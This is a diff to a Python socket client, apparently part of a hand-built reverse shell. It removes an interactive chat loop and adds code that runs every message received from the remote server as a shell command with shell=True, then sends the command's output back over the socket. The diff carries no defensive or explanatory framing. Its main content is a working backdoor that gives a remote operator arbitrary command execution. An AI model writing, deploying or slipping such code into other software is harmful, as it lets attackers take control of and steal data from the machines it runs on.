@@ -1,4 +1,5 @@
 import socket
+import subprocess
 
 # Forms connection to server with IP and port
 def session_handler():
@@ -15,17 +16,11 @@ def session_handler():
                     print('[+] Connection closed from remote host')
                     sock.close()
                     break
+                else:
+                    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    output = command.stdout.read() + command.stderr.read()
+                    sock.send(output)
 
-                print(message)
-                message = input('Message to send #> ')
-                # Exit message handler
-                if message.lower() == 'exit':
-                    print('[+] Closing connection...')
-                    sock.send(message.encode())
-                    sock.close()
-                    break
-
-                sock.send(message.encode())
 
             except KeyboardInterrupt:
                 print("\n[+] Keyboard Interrupt Issued")
